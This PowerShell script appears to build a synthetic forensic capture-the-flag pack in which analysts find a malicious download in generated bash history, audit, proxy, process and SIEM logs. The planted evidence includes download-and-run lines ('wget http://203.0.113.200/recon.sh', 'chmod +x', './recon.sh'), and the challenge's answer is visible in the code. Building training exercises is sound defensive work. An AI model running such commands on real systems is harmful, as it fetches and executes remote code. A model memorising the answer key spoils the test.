param()

$ErrorActionPreference = "Stop"

$bundleName = "m5-03-bash-history-review"
$artifactRoot = Join-Path $PSScriptRoot "..\artifacts\m5"
$artifactRoot = [System.IO.Path]::GetFullPath($artifactRoot)
$zipPath = Join-Path $artifactRoot "$bundleName.zip"
$buildRoot = Join-Path $env:TEMP "m5_03_realworld_build"
$bundleRoot = Join-Path $buildRoot $bundleName

function Write-TextFile {
    param([string]$Path, [string]$Content)
    $parent = Split-Path -Parent $Path
    if ($parent) {
        New-Item -ItemType Directory -Force -Path $parent | Out-Null
    }
    [System.IO.File]::WriteAllText(
        $Path,
        $Content.Replace("`n", [Environment]::NewLine),
        [System.Text.Encoding]::UTF8
    )
}

function Write-LinesFile {
    param([string]$Path, [System.Collections.Generic.List[string]]$Lines)
    $parent = Split-Path -Parent $Path
    if ($parent) {
        New-Item -ItemType Directory -Force -Path $parent | Out-Null
    }
    [System.IO.File]::WriteAllLines($Path, $Lines, [System.Text.Encoding]::UTF8)
}

function New-BashHistory {
    param([string]$OutputPath)

    $lines = New-Object System.Collections.Generic.List[string]
    $benign = @(
        "ls -la",
        "cd /var/www/app",
        "git status",
        "sudo systemctl status nginx",
        "tail -n 50 /var/log/auth.log",
        "cat /etc/os-release",
        "df -h",
        "free -m",
        "journalctl -u ssh --since '1 hour ago'",
        "sudo apt update",
        "python3 manage.py migrate --check",
        "crontab -l",
        "ss -tulpen",
        "top -b -n 1 | head -n 20"
    )

    for ($i = 0; $i -lt 9200; $i++) {
        $lines.Add($benign[$i % $benign.Count])
        if (($i % 211) -eq 0) {
            $lines.Add("history | tail -n 20")
        }
        if (($i % 389) -eq 0) {
            $lines.Add("echo 'deployment check completed'")
        }
    }

    $lines.Add("cd /tmp")
    $lines.Add("wget http://203.0.113.200/recon.sh")
    $lines.Add("chmod +x recon.sh")
    $lines.Add("./recon.sh")
    $lines.Add("rm -f recon.sh")
    Write-LinesFile -Path $OutputPath -Lines $lines
}

function New-CommandAuditLog {
    param([string]$OutputPath)

    $lines = New-Object System.Collections.Generic.List[string]
    $base = [datetime]::SpecifyKind([datetime]"2026-03-07T00:00:00", [DateTimeKind]::Utc)

    for ($i = 0; $i -lt 7800; $i++) {
        $ts = $base.AddSeconds($i * 8).ToString("yyyy-MM-ddTHH:mm:ssZ")
        $user = if (($i % 7) -eq 0) { "opsadmin" } else { "deploy" }
        $cmd = if (($i % 151) -eq 0) { "ls -la /var/www/app" } else { "cat /proc/uptime" }
        $lines.Add("$ts auditd type=EXECVE user=$user tty=pts/$($i % 4) host=lin-web-03 command=""$cmd"" result=success")
    }

    $lines.Add("2026-03-08T01:54:21Z auditd type=EXECVE user=deploy tty=pts/1 host=lin-web-03 command=""wget http://203.0.113.200/recon.sh"" result=success")
    $lines.Add("2026-03-08T01:54:30Z auditd type=EXECVE user=deploy tty=pts/1 host=lin-web-03 command=""chmod +x recon.sh"" result=success")
    $lines.Add("2026-03-08T01:54:36Z auditd type=EXECVE user=deploy tty=pts/1 host=lin-web-03 command=""./recon.sh"" result=success")
    Write-LinesFile -Path $OutputPath -Lines $lines
}

function New-ProxyLog {
    param([string]$OutputPath)

    $lines = New-Object System.Collections.Generic.List[string]
    $base = [datetime]::SpecifyKind([datetime]"2026-03-07T00:00:00", [DateTimeKind]::Utc)
    $domains = @("packages.ubuntu.com","pypi.org","github.com","security.ubuntu.com","docs.python.org")

    for ($i = 0; $i -lt 6400; $i++) {
        $ts = $base.AddSeconds($i * 10).ToString("o")
        $domain = $domains[$i % $domains.Count]
        $ip = "10.$(40 + ($i % 30)).$((10 + $i) % 220).$((20 + $i) % 220)"
        $uri = "/resource/$((1000 + $i) % 9000)"
        $status = if (($i % 227) -eq 0) { 304 } else { 200 }
        $lines.Add("$ts src=$ip method=GET domain=$domain uri=$uri status=$status bytes=$((500 + ($i % 8000)))")
    }

    $lines.Add("2026-03-08T01:54:21Z src=10.62.44.91 method=GET domain=203.0.113.200 uri=/recon.sh status=200 bytes=18244 user=deploy-agent")
    Write-LinesFile -Path $OutputPath -Lines $lines
}

function New-ProcessTree {
    param([string]$OutputPath)

    $lines = New-Object System.Collections.Generic.List[string]
    $lines.Add("timestamp_utc,pid,ppid,user,process,cmdline")
    $base = [datetime]::SpecifyKind([datetime]"2026-03-07T00:00:00", [DateTimeKind]::Utc)

    for ($i = 0; $i -lt 5200; $i++) {
        $ts = $base.AddSeconds($i * 11).ToString("o")
        $procId = 3000 + ($i % 5000)
        $ppid = 1000 + ($i % 300)
        $user = if (($i % 5) -eq 0) { "deploy" } else { "www-data" }
        $proc = if (($i % 17) -eq 0) { "python3" } else { "bash" }
        $cmd = if ($proc -eq "python3") { "python3 /opt/worker/task.py --run" } else { "/bin/bash -c 'health-check'" }
        $lines.Add("$ts,$procId,$ppid,$user,$proc,$cmd")
    }

    $lines.Add("2026-03-08T01:54:21Z,8221,8120,deploy,bash,/bin/bash -c wget http://203.0.113.200/recon.sh")
    $lines.Add("2026-03-08T01:54:36Z,8224,8221,deploy,bash,/bin/bash -c ./recon.sh")
    Write-LinesFile -Path $OutputPath -Lines $lines
}

function New-IdentityAlerts {
    param([string]$OutputPath)

    $lines = New-Object System.Collections.Generic.List[string]
    $base = [datetime]::SpecifyKind([datetime]"2026-03-07T00:00:00", [DateTimeKind]::Utc)
    $types = @("shell_activity_watch","script_exec_watch","egress_watch","admin_session_watch")

    for ($i = 0; $i -lt 4100; $i++) {
        $entry = [ordered]@{
            timestamp_utc = $base.AddSeconds($i * 12).ToString("o")
            alert_id = "cmd-" + ("{0:D8}" -f (72000000 + $i))
            severity = if (($i % 167) -eq 0) { "medium" } else { "low" }
            type = $types[$i % $types.Count]
            status = "closed_noise"
            detail = "routine shell usage"
        }
        $lines.Add(($entry | ConvertTo-Json -Compress))
    }

    $lines.Add((([ordered]@{
        timestamp_utc = "2026-03-08T01:54:21Z"
        alert_id = "cmd-99911002"
        severity = "high"
        type = "suspicious_download_command"
        status = "open"
        detail = "shell command downloaded executable script from external source"
        command_family = "wget"
        source_host = "lin-web-03"
    }) | ConvertTo-Json -Compress))
    Write-LinesFile -Path $OutputPath -Lines $lines
}

function New-SiemTimeline {
    param([string]$OutputPath)

    $lines = New-Object System.Collections.Generic.List[string]
    $lines.Add("timestamp_utc,event_type,system,severity,details")
    $base = [datetime]::SpecifyKind([datetime]"2026-03-07T00:00:00", [DateTimeKind]::Utc)

    for ($i = 0; $i -lt 5000; $i++) {
        $ts = $base.AddSeconds($i * 10).ToString("o")
        $evt = if (($i % 283) -eq 0) { "shell_review" } else { "routine_command_monitoring" }
        $sev = if ($evt -eq "shell_review") { "medium" } else { "low" }
        $lines.Add("$ts,$evt,siem-cmd-01,$sev,command telemetry baseline")
    }

    $lines.Add("2026-03-08T01:54:21Z,external_script_download,siem-cmd-01,high,deploy user downloaded recon.sh using wget")
    $lines.Add("2026-03-08T01:54:36Z,suspicious_script_execution,siem-cmd-01,high,recon.sh executed in /tmp")
    $lines.Add("2026-03-08T01:54:44Z,incident_opened,siem-cmd-01,high,INC-2026-5503 bash history review")
    Write-LinesFile -Path $OutputPath -Lines $lines
}

function New-ShellPolicy {
    param([string]$OutputPath)

    $content = @'
Linux Shell Monitoring Policy (Excerpt)

1) Direct internet script downloads from interactive shells are restricted.
2) Investigations must identify the command family used for suspicious downloads.
3) High-risk command execution from /tmp requires immediate SOC review.
'@
    Write-TextFile -Path $OutputPath -Content $content
}

function New-Runbook {
    param([string]$OutputPath)

    $content = @'
Compromised Shell Triage Runbook (Excerpt)

1) Review shell history and audit EXECVE telemetry.
2) Correlate download action with proxy network evidence.
3) Confirm command used to fetch suspicious payload.
4) Escalate if downloaded script is executed from writable temp path.
'@
    Write-TextFile -Path $OutputPath -Content $content
}

Remove-Item -Recurse -Force $buildRoot -ErrorAction SilentlyContinue
New-Item -ItemType Directory -Force -Path (Join-Path $bundleRoot "evidence") | Out-Null

$description = @'
Challenge: M5-03 Bash History Review (Real-World Investigation Pack)

Scenario:
SOC analysts suspect a compromised Linux session downloaded and executed a suspicious script.

Task:
Analyze the investigation pack and identify the command used to download the malicious script.

Flag format:
CTF{answer}
'@
Write-TextFile -Path (Join-Path $bundleRoot "description.txt") -Content $description

$ticket = @'
Incident: INC-2026-5503
Severity: High
Queue: SOC + Linux Ops

Summary:
Command telemetry shows possible script download and execution from an interactive shell.

Scope:
- Host: lin-web-03
- Window: 2026-03-08 01:54 UTC
- Goal: identify the download command used by attacker/operator
'@
Write-TextFile -Path (Join-Path $bundleRoot "evidence\briefing\incident_ticket.txt") -Content $ticket

$handoff = @'
Analyst handoff:
- Correlate bash history, audit command execution logs, proxy requests, process lineage, SIEM timeline, alerts, and policy/runbook guidance.
- Determine the command used to download the suspicious script.
'@
Write-TextFile -Path (Join-Path $bundleRoot "evidence\briefing\analyst_handoff.txt") -Content $handoff

New-BashHistory -OutputPath (Join-Path $bundleRoot "evidence\shell\bash_history")
New-CommandAuditLog -OutputPath (Join-Path $bundleRoot "evidence\audit\command_exec_audit.log")
New-ProxyLog -OutputPath (Join-Path $bundleRoot "evidence\network\proxy_egress.log")
New-ProcessTree -OutputPath (Join-Path $bundleRoot "evidence\host\process_lineage.csv")
New-IdentityAlerts -OutputPath (Join-Path $bundleRoot "evidence\security\command_alerts.jsonl")
New-SiemTimeline -OutputPath (Join-Path $bundleRoot "evidence\siem\timeline_events.csv")
New-ShellPolicy -OutputPath (Join-Path $bundleRoot "evidence\policy\linux_shell_monitoring_policy.txt")
New-Runbook -OutputPath (Join-Path $bundleRoot "evidence\policy\compromised_shell_triage_runbook.txt")

New-Item -ItemType Directory -Force -Path $artifactRoot | Out-Null
if (Test-Path $zipPath) {
    Remove-Item -Force $zipPath
}
Compress-Archive -Path (Join-Path $bundleRoot "*") -DestinationPath $zipPath -Force
Remove-Item -Recurse -Force $buildRoot

Get-Item $zipPath | Select-Object FullName, Length, LastWriteTime
